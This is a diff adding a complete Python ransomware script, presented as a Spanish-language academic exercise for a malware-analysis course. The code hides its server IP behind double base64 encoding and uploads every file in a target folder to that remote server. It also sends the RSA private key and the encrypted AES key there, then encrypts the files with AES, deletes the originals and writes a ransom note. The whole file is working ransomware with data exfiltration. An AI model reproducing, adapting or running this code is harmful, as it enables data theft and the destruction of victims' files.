@@ -1,0 +1,548 @@
+import os
+import base64
+import uuid
+import json
+import logging
+import requests
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from werkzeug.utils import secure_filename
+import shutil
+import datetime
+import traceback
+import time
+
+# Rutas importantes
+TARGET_PATH = r'C:\Users\keepcoding\Desktop\keepcoding'
+PRIVATE_KEY_STORAGE_DIR = os.path.join(TARGET_PATH, 'private_keys')
+UPLOAD_FOLDER = TARGET_PATH
+RSA_PUBLIC_KEY_PATH = os.path.join(PRIVATE_KEY_STORAGE_DIR, 'public_key.pem')
+
+# Ofuscación de la IP real - usando método simple pero efectivo
+def get_server_url():
+    # Base64 ofuscada - 'MTMuNDguMTA2LjIzMw==' -> '13.48.106.233'
+    encoded_ip = "TVRNdU5EZ3VNVEEyTGpJek13PT0="  # Doble codificación base64
+    ip = base64.b64decode(base64.b64decode(encoded_ip).decode('utf-8')).decode('utf-8')
+    return f"http://{ip}:5000"
+
+# URL para mostrar (esto es solo para mostrar en logs y resumen)
+DISPLAY_URL = "https://sparkling-crumble-096d1a.netlify.app"
+FLASK_SERVER_URL = get_server_url()  # Usamos la IP ofuscada
+
+# Nombre del archivo de nota de rescate
+RANSOM_NOTE = "LEEME_IMPORTANTE.txt"
+
+# Configurar logging
+LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
+os.makedirs(LOG_DIR, exist_ok=True)
+logging.basicConfig(
+    filename=os.path.join(LOG_DIR, 'ransomware.log'),
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
+# Verificar que la carpeta objetivo existe
+def ensure_target_folder_exists():
+    if not os.path.exists(TARGET_PATH):
+        try:
+            os.makedirs(TARGET_PATH, exist_ok=True)
+            print(f"✅ Carpeta objetivo creada: {TARGET_PATH}")
+            logging.info(f"Carpeta objetivo creada: {TARGET_PATH}")
+            # Crear archivos de prueba
+            create_test_files(TARGET_PATH)
+        except Exception as e:
+            print(f"❌ Error al crear carpeta objetivo: {e}")
+            logging.error(f"Error al crear carpeta objetivo: {e}")
+            return False
+    return True
+
+# Crear archivos de prueba si no existen
+def create_test_files(path):
+    try:
+        test_files = [
+            ("documento1.txt", "Este es un archivo de texto de prueba para el ejercicio de ransomware."),
+            ("importante.pdf", "%PDF-1.5\nEste es un PDF simulado para el ejercicio de ransomware."),
+            ("datos.doc", "Este es un archivo DOC simulado para el ejercicio de ransomware.")
+        ]
+        
+        for filename, content in test_files:
+            file_path = os.path.join(path, filename)
+            if not os.path.exists(file_path):
+                with open(file_path, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                print(f"✅ Archivo de prueba creado: {file_path}")
+                logging.info(f"Archivo de prueba creado: {file_path}")
+    except Exception as e:
+        print(f"❌ Error al crear archivos de prueba: {e}")
+        logging.error(f"Error al crear archivos de prueba: {e}")
+
+# Crear carpeta para claves privadas si no existe
+def ensure_private_key_dir_exists():
+    if not os.path.exists(PRIVATE_KEY_STORAGE_DIR):
+        try:
+            os.makedirs(PRIVATE_KEY_STORAGE_DIR, exist_ok=True)
+            print(f"✅ Carpeta para claves creada: {PRIVATE_KEY_STORAGE_DIR}")
+            logging.info(f"Carpeta para claves creada: {PRIVATE_KEY_STORAGE_DIR}")
+        except Exception as e:
+            print(f"❌ Error al crear carpeta para claves: {e}")
+            logging.error(f"Error al crear carpeta para claves: {e}")
+            return False
+    return True
+
+# Eliminar carpeta de claves privadas
+def remove_private_key_dir():
+    try:
+        if os.path.exists(PRIVATE_KEY_STORAGE_DIR):
+            shutil.rmtree(PRIVATE_KEY_STORAGE_DIR)
+            print(f"✅ Carpeta de claves eliminada: {PRIVATE_KEY_STORAGE_DIR}")
+            logging.info(f"Carpeta de claves eliminada: {PRIVATE_KEY_STORAGE_DIR}")
+            return True
+    except Exception as e:
+        print(f"❌ Error al eliminar carpeta de claves: {e}")
+        logging.error(f"Error al eliminar carpeta de claves: {e}")
+        return False
+
+# Generar identificadores únicos
+def generate_session_id():
+    return str(uuid.uuid4())
+
+def generate_machine_id():
+    return str(uuid.uuid4())
+
+# Generar clave RSA si no existe
+def ensure_rsa_keys_exist():
+    ensure_private_key_dir_exists()
+    
+    if not os.path.exists(RSA_PUBLIC_KEY_PATH):
+        try:
+            key = RSA.generate(2048)
+            private_key = key.export_key()
+            public_key = key.publickey().export_key()
+
+            private_key_path = os.path.join(PRIVATE_KEY_STORAGE_DIR, 'private_key.pem')
+            with open(private_key_path, 'wb') as f:
+                f.write(private_key)
+            with open(RSA_PUBLIC_KEY_PATH, 'wb') as f:
+                f.write(public_key)
+
+            print(f"✅ Par de claves RSA generado.")
+            print(f"🔒 Clave privada guardada en: {private_key_path}")
+            print(f"🔓 Clave pública guardada en: {RSA_PUBLIC_KEY_PATH}")
+            logging.info(f"Par de claves RSA generado. Privada: {private_key_path}, Pública: {RSA_PUBLIC_KEY_PATH}")
+            return private_key, public_key
+        except Exception as e:
+            print(f"❌ Error al generar claves RSA: {e}")
+            logging.error(f"Error al generar claves RSA: {e}")
+            return None, None
+    else:
+        try:
+            with open(os.path.join(PRIVATE_KEY_STORAGE_DIR, 'private_key.pem'), 'rb') as f:
+                private_key = f.read()
+            with open(RSA_PUBLIC_KEY_PATH, 'rb') as f:
+                public_key = f.read()
+            print("✅ Claves RSA existentes cargadas correctamente.")
+            logging.info("Claves RSA existentes cargadas correctamente.")
+            return private_key, public_key
+        except Exception as e:
+            print(f"❌ Error al cargar claves RSA existentes: {e}")
+            logging.error(f"Error al cargar claves RSA existentes: {e}")
+            return None, None
+
+# Cifrar archivo con AES
+def encrypt_file_with_aes(file_path, aes_key):
+    try:
+        cipher = AES.new(aes_key, AES.MODE_GCM)
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        ciphertext, tag = cipher.encrypt_and_digest(data)
+        encrypted_file_path = f"{file_path}.enc"
+        with open(encrypted_file_path, 'wb') as f:
+            f.write(cipher.nonce + tag + ciphertext)
+        print(f"✅ Archivo cifrado: {file_path}")
+        logging.info(f"Archivo cifrado: {file_path}")
+        return encrypted_file_path
+    except Exception as e:
+        print(f"❌ Error al cifrar {file_path}: {e}")
+        logging.error(f"Error al cifrar {file_path}: {e}")
+        return None
+
+# Cifrar clave AES con RSA
+def encrypt_aes_key_with_rsa(aes_key, rsa_public_key):
+    try:
+        rsa_key = RSA.import_key(rsa_public_key)
+        cipher_rsa = PKCS1_OAEP.new(rsa_key)
+        encrypted_key = cipher_rsa.encrypt(aes_key)
+        return base64.b64encode(encrypted_key).decode('utf-8')
+    except Exception as e:
+        print(f"❌ Error al cifrar clave AES con RSA: {e}")
+        logging.error(f"Error al cifrar clave AES con RSA: {e}")
+        traceback.print_exc()
+        return None
+
+# Guardar clave en archivo para enviar por otro método si las peticiones web fallan
+def save_keys_for_exfiltration(session_id, machine_id, private_key_data, aes_key, aes_encrypted):
+    try:
+        # Creamos carpeta para las claves
+        recovery_dir = os.path.dirname(os.path.abspath(__file__))
+        keys_dir = os.path.join(recovery_dir, "recovery_keys")
+        os.makedirs(keys_dir, exist_ok=True)
+        
+        # Guardamos clave privada RSA
+        rsa_path = os.path.join(keys_dir, f"{session_id}_{machine_id}_private.pem")
+        with open(rsa_path, 'wb') as f:
+            f.write(private_key_data)
+            
+        # Guardamos clave AES sin cifrar
+        aes_path = os.path.join(keys_dir, f"{session_id}_{machine_id}_aes.bin")
+        with open(aes_path, 'wb') as f:
+            f.write(aes_key)
+            
+        # Guardamos clave AES cifrada con RSA
+        if aes_encrypted:
+            aes_enc_path = os.path.join(keys_dir, f"{session_id}_{machine_id}_aes_encrypted.txt")
+            with open(aes_enc_path, 'w') as f:
+                f.write(aes_encrypted)
+        
+        # Guardamos metadatos
+        meta_path = os.path.join(keys_dir, f"{session_id}_{machine_id}_metadata.json")
+        with open(meta_path, 'w') as f:
+            json.dump({
+                'session_id': session_id,
+                'machine_id': machine_id,
+                'timestamp': str(datetime.datetime.now()),
+                'target_path': TARGET_PATH
+            }, f, indent=4)
+            
+        print(f"✅ Claves guardadas en: {keys_dir}")
+        logging.info(f"Claves guardadas en: {keys_dir}")
+        return True
+    except Exception as e:
+        print(f"❌ Error al guardar claves para exfiltración: {e}")
+        logging.error(f"Error al guardar claves para exfiltración: {e}")
+        return False
+
+# Subir archivo a Flask
+def upload_file_to_flask(file_path, url=None):
+    if url is None:
+        url = FLASK_SERVER_URL
+        
+    try:
+        with open(file_path, 'rb') as f:
+            files = {'file': (os.path.basename(file_path), f)}
+            try:
+                response = requests.post(f'{url}/upload', files=files, timeout=15)
+                if response.status_code == 200:
+                    print(f"✅ Archivo {os.path.basename(file_path)} subido.")
+                    logging.info(f"Archivo {os.path.basename(file_path)} subido.")
+                    return True
+                else:
+                    print(f"❌ Error al subir {file_path}: {response.status_code}")
+                    logging.error(f"Error al subir {file_path}: {response.status_code}")
+                    return False
+            except Exception as e:
+                print(f"❌ Fallo de conexión al subir {file_path}: {e}")
+                logging.error(f"Fallo de conexión al subir {file_path}: {e}")
+                return False
+    except Exception as e:
+        print(f"❌ Error al leer {file_path}: {e}")
+        logging.error(f"Error al leer {file_path}: {e}")
+        return False
+
+# Subir clave AES cifrada
+def upload_encrypted_aes_key_to_flask(encrypted_aes_key, session_id, machine_id, url=None):
+    if url is None:
+        url = FLASK_SERVER_URL
+        
+    try:
+        # Primero probamos con datos en formato JSON
+        data_json = {
+            'encrypted_key': encrypted_aes_key,
+            'session_id': session_id,
+            'machine_id': machine_id,
+            'timestamp': str(datetime.datetime.now())
+        }
+        
+        # Intentar con JSON
+        try:
+            response = requests.post(f'{url}/store_key', json=data_json, timeout=15)
+            if response.status_code == 200:
+                print("✅ Clave AES cifrada subida.")
+                logging.info("Clave AES cifrada subida.")
+                return True
+        except Exception:
+            pass  # Intentamos con form-data si JSON falla
+            
+        # Si JSON falla, intentamos con form-data
+        form_data = {
+            'key': encrypted_aes_key,
+            'filename': f"{session_id}_{machine_id}.key"
+        }
+        
+        response = requests.post(f'{url}/store_key', data=form_data, timeout=15)
+        if response.status_code == 200:
+            print("✅ Clave AES cifrada subida (usando form-data).")
+            logging.info("Clave AES cifrada subida (usando form-data).")
+            return True
+        else:
+            print(f"❌ Error al subir clave AES: {response.status_code}")
+            logging.error(f"Error al subir clave AES: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Fallo de conexión al subir clave AES: {e}")
+        logging.error(f"Fallo de conexión al subir clave AES: {e}")
+        return False
+
+# Subir clave privada RSA al servidor
+def upload_private_key_to_flask(private_key_data, session_id, machine_id, url=None):
+    if url is None:
+        url = FLASK_SERVER_URL
+        
+    try:
+        # Convertir a base64
+        private_key_b64 = base64.b64encode(private_key_data).decode('utf-8')
+        
+        # Primero intentamos con endpoint específico
+        data = {
+            'private_key': private_key_b64,
+            'session_id': session_id, 
+            'machine_id': machine_id,
+            'timestamp': str(datetime.datetime.now())
+        }
+        
+        try:
+            # Intentamos con el endpoint específico primero
+            response = requests.post(f'{url}/store_private_key', json=data, timeout=20)
+            if response.status_code == 200:
+                print("✅ Clave privada RSA subida al servidor.")
+                logging.info("Clave privada RSA subida al servidor.")
+                return True
+        except Exception as e:
+            print(f"⚠️ Problemas con endpoint específico. Intentando método alternativo...")
+            # Si falla, continuamos con el método alternativo
+            pass
+        
+        # Si no funcionó el endpoint específico, intentamos subirla como archivo
+        filename = f"{session_id}_{machine_id}_private.pem"
+        temp_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
+        
+        with open(temp_path, 'wb') as f:
+            f.write(private_key_data)
+            
+        result = upload_file_to_flask(temp_path, url)
+        
+        # Eliminamos el archivo temporal
+        if os.path.exists(temp_path):
+            os.remove(temp_path)
+            
+        if result:
+            print("✅ Clave privada RSA subida como archivo.")
+            logging.info("Clave privada RSA subida como archivo.")
+            return True
+        else:
+            print("❌ Error al subir clave privada RSA como archivo.")
+            logging.error("Error al subir clave privada RSA como archivo.")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Error al preparar clave privada: {e}")
+        logging.error(f"Error al preparar clave privada: {e}")
+        traceback.print_exc()
+        return False
+
+# Crear nota de rescate
+def create_ransom_note(target_dir, session_id, machine_id):
+    try:
+        ransom_note_content = f"""
+╔══════════════════════════════════════════════════════════╗
+║               ¡ATENCIÓN! ARCHIVOS ENCRIPTADOS            ║
+╠══════════════════════════════════════════════════════════╣
+║                                                          ║
+║  Todos los archivos de esta carpeta han sido encriptados ║
+║  como parte del ejercicio académico de KeepCoding.       ║
+║                                                          ║
+║  Este ransomware ha:                                     ║
+║   1. Subido copias de tus archivos a nuestro servidor    ║
+║   2. Encriptado todos los archivos con AES-256           ║
+║   3. Protegido la clave AES con encriptación RSA-2048    ║
+║   4. Subido las claves de recuperación al servidor       ║
+║                                                          ║
+║  Para recuperar tus archivos debes:                      ║
+║   * Contactar al estudiante para verificar               ║
+║     que esto es parte del ejercicio académico            ║
+║                                                          ║
+║  ID de sesión: {session_id}                              ║
+║  ID de máquina: {machine_id}                             ║
+║  Fecha y hora: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝
+"""
+        
+        note_path = os.path.join(target_dir, RANSOM_NOTE)
+        with open(note_path, 'w', encoding='utf-8') as f:
+            f.write(ransom_note_content)
+        
+        print(f"✅ Nota de rescate creada en: {note_path}")
+        logging.info(f"Nota de rescate creada en: {note_path}")
+        return True
+    except Exception as e:
+        print(f"❌ Error al crear nota de rescate: {e}")
+        logging.error(f"Error al crear nota de rescate: {e}")
+        return False
+
+# Comprobar si hay archivos para cifrar
+def check_files_exist(target_dir):
+    try:
+        for file in os.listdir(target_dir):
+            file_path = os.path.join(target_dir, file)
+            if os.path.isfile(file_path) and not file == RANSOM_NOTE and not file.endswith('.enc'):
+                return True
+        return False
+    except Exception as e:
+        print(f"❌ Error al verificar archivos: {e}")
+        logging.error(f"Error al verificar archivos: {e}")
+        return False
+
+# Procesamiento principal
+def process_files_and_upload():
+    print("""
+╔══════════════════════════════════════════════════════════╗
+║                RANSOMWARE EDUCATIVO - INICIO             ║
+╠══════════════════════════════════════════════════════════╣
+║                                                          ║
+║  Este programa es parte de un ejercicio académico        ║
+║  para la asignatura de análisis de malware.              ║
+║                                                          ║
+║  Objetivo:                                               ║
+║   - Exfiltrar archivos al servidor                       ║
+║   - Implementar encriptación híbrida (AES + RSA)         ║
+║   - Cifrar archivos específicos                          ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝
+    """)
+    
+    # Verificar que la carpeta objetivo existe
+    if not ensure_target_folder_exists():
+        return False
+    
+    # Verificar si hay archivos para procesar
+    if not check_files_exist(TARGET_PATH):
+        print("⚠️ No se encontraron archivos para cifrar. Creando archivos de prueba...")
+        create_test_files(TARGET_PATH)
+    
+    # Generar identificadores
+    session_id = generate_session_id()
+    machine_id = generate_machine_id()
+    print(f"🔁 session_id: {session_id}")
+    print(f"💻 machine_id: {machine_id}")
+    logging.info(f"Session ID: {session_id}, Machine ID: {machine_id}")
+    
+    # Asegurar que existan las claves RSA
+    private_key_data, public_key_data = ensure_rsa_keys_exist()
+    if not private_key_data or not public_key_data:
+        return False
+
+    # Contar archivos procesados
+    files_found = 0
+    files_exfiltrated = 0
+    files_encrypted = 0
+
+    # FASE 1: Exfiltrar archivos originales
+    print("\n[+] FASE 1: Exfiltrando archivos originales...")
+    for filename in os.listdir(UPLOAD_FOLDER):
+        file_path = os.path.join(UPLOAD_FOLDER, filename)
+
+        if os.path.isfile(file_path) and not filename == RANSOM_NOTE and not filename.endswith('.enc'):
+            files_found += 1
+            print(f"📂 Procesando archivo: {filename}")
+
+            # Subir archivo original
+            if upload_file_to_flask(file_path):
+                files_exfiltrated += 1
+
+    # FASE 2: Subir clave privada RSA al servidor (ANTES del cifrado)
+    print("\n[+] FASE 2: Subiendo clave privada RSA al servidor para recuperación...")
+    key_upload_success = upload_private_key_to_flask(private_key_data, session_id, machine_id)
+    
+    # FASE 3: Cifrar archivos
+    print("\n[+] FASE 3: Cifrando archivos con AES...")
+    # Generar una clave AES única para todos los archivos
+    aes_key = get_random_bytes(16)
+    
+    for filename in os.listdir(UPLOAD_FOLDER):
+        file_path = os.path.join(UPLOAD_FOLDER, filename)
+
+        if os.path.isfile(file_path) and not filename == RANSOM_NOTE and not filename.endswith('.enc'):
+            # Cifrar archivo
+            encrypted_file_path = encrypt_file_with_aes(file_path, aes_key)
+            if encrypted_file_path:
+                files_encrypted += 1
+                
+                # NO eliminamos el archivo cifrado, eliminamos el original
+                os.remove(file_path)
+
+    # FASE 4: Cifrar y subir clave AES
+    print("\n[+] FASE 4: Cifrando clave AES con RSA y subiendo al servidor...")
+    # Cifrar clave AES
+    encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key_data)
+    aes_upload_success = False
+    if encrypted_aes_key:
+        aes_upload_success = upload_encrypted_aes_key_to_flask(encrypted_aes_key, session_id, machine_id)
+    
+    # FASE 5: Guardar copias locales de todas las claves
+    print("\n[+] FASE 5: Guardando copias locales de las claves...")
+    save_keys_for_exfiltration(session_id, machine_id, private_key_data, aes_key, encrypted_aes_key)
+    
+    # FASE 6: Crear nota de rescate
+    print("\n[+] FASE 6: Creando nota de rescate...")
+    create_ransom_note(TARGET_PATH, session_id, machine_id)
+    
+    # FASE 7: Eliminar carpeta de claves privadas
+    print("\n[+] FASE 7: Eliminando carpeta de claves privadas...")
+    remove_private_key_dir()
+
+    # Directorio de copias de seguridad
+    recovery_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "recovery_keys")
+    
+    # Resumen
+    summary = f"""
+[+] RESUMEN DE LA OPERACIÓN:
+    - Archivos encontrados: {files_found}
+    - Archivos exfiltrados: {files_exfiltrated}
+    - Archivos cifrados: {files_encrypted}
+    - Directorio objetivo: {TARGET_PATH}
+    - ID de sesión: {session_id}
+    - ID de máquina: {machine_id}
+    - Fecha y hora: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+    - Clave privada RSA subida: {"Sí" if key_upload_success else "No"}
+    - Clave AES cifrada subida: {"Sí" if aes_upload_success else "No"}
+    - URL utilizada: {DISPLAY_URL}
+    - Copias de seguridad creadas en: {recovery_dir}
+"""
+    print(summary)
+    logging.info(summary)
+    
+    print("""
+╔══════════════════════════════════════════════════════════╗
+║              RANSOMWARE EDUCATIVO - COMPLETADO           ║
+╠══════════════════════════════════════════════════════════╣
+║                                                          ║
+║  La exfiltración y cifrado han sido completados.         ║
+║  Se ha creado una nota de rescate en el directorio.      ║
+║  La carpeta de claves privadas ha sido eliminada.        ║
+║  Se han guardado copias de seguridad de las claves.      ║
+║                                                          ║
+║  Verifique los logs para más detalles.                   ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝
+    """)
+    return True
+
+if __name__ == "__main__":
+    try:
+        process_files_and_upload()
+    except Exception as e:
+        print(f"❌ Error crítico: {e}")
+        logging.critical(f"Error crítico: {e}")
+        traceback.print_exc()
